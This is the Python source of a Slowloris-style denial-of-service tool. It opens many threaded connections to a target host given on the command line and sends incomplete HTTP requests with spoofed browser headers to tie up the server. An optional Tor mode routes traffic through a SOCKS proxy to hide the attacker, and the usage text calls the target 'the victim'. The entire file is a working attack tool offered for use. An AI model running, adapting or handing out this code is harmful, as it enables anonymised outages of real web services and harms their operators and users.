#!/usr/bin/env python3

import sys
import socks
import socket
import time
import signal
import threading

MAX_THREAD    = 8
TIMEOUT_INTVL = 5
TIMEOUT_TCP   = 10
TIMEOUT_REQ   = 90

class termcolor:
    OK = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    NONE = '\033[0m'

def slowloris():
    url = sys.argv[1]
    hostport = url.split(':')
    host = hostport[0]
    port = int(hostport[1]) if len(hostport) == 2 else 80
    is_tor = len(sys.argv) > 2 and sys.argv[2] in [ '-t', '--tor' ]
    
    print_target(host, port)
    print_status()
    start_attack_thread(host, port, is_tor)

    try:
        interruptable_event().wait()
    except KeyboardInterrupt:
        sys.exit(0)

def start_attack_thread(host, port, is_tor):
    i = 0
    while i < MAX_THREAD:
        try:
            thread = threading.Thread(target=setup_attack, args=[host, port, is_tor])
            thread.daemon = True
            thread.start()
            i += 1
        except:
            pass

def setup_attack(host, port, is_tor):
    while True:
        sockets = []
        tries_failed = 0

        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if is_tor:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
                socket.socket = socks.socksocket

            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            if sys.platform == 'linux' or sys.platform == 'linux2':
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, TIMEOUT_INTVL)
            elif sys.platform == 'darwin':
                sock.setsockopt(socket.IPPROTO_TCP, 0x10, TIMEOUT_INTVL)
            elif sys.platform == 'win32':
                sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, TIMEOUT_REQ * 1000, TIMEOUT_INTVL * 1000))
            
            sock.settimeout(TIMEOUT_TCP)
            sockets.append(sock)

            if not send_payload(sock, host, port, is_tor):
                tries_failed += 1

            if tries_failed > 5:
                break

        time.sleep(TIMEOUT_REQ)
        disconnect_sockets(sockets)

def send_payload(sock, host, port, is_tor):
    random = int(time.time() * 1_000) % 10_000
    method = 'POST' if random % 2 == 0 else 'GET'
    payload = ('%s /?%i HTTP/1.1\r\n'
        'Host: %s\r\n'
        'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\r\n'
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'
        'Connection: Keep-Alive\r\n'
        'Keep-Alive: timeout=120\r\n'
        'Content-Length: 42\r\n') % (method, random, host)

    try:
        is_tor and sock.get_proxy_sockname()
        sock.connect((host, port))
        sock.sendall(payload.encode('utf-8'))
    except (AttributeError, socks.ProxyConnectionError):
        print_status('waiting for TOR\u2026')
        return True
    except Exception as e:
        send_payload.amount_failed += 1
        print_status()
        return False

    send_payload.amount_success += 1
    print_status()
    return True

send_payload.amount_success = 0
send_payload.amount_failed  = 0

def print_target(host, port):
    str_target = 'Attacking %s%s:%i%s' % (termcolor.BOLD, host, port, termcolor.NONE)
    print(str_target)

def print_status(str_extra=None):
    str_success = termcolor.OK + '  Payloads successful: %i' % send_payload.amount_success
    str_and = termcolor.NONE + ', '
    str_failed = termcolor.FAIL + 'payloads failed: %i' % send_payload.amount_failed
    str_extra = termcolor.NONE + (', ' + str_extra if str_extra else '')
    
    print(str_success + str_and + str_failed + str_extra + termcolor.NONE, end='\r')
    sys.stdout.write("\033[K")

def disconnect_sockets(sockets):
    for sock in sockets:
        try:
            sock.shutdown(SHUT_RDWR)
        except:
            pass
        finally:
            sock.close()

def interruptable_event():
    e = threading.Event()

    def patched_wait():
        while not e.is_set():
            e._wait(3)

    e._wait = e.wait
    e.wait = patched_wait
    return e

def signal_handler(signal, frame):
    print_status(':)\n')
    sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2 or not sys.argv[1]:
        print('No URL or IP of the victim given')
        print('Usage: ~$ ./slowloris.py host:port {-t/--tor}')
        sys.exit(1)

    signal.signal(signal.SIGHUP, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    slowloris()

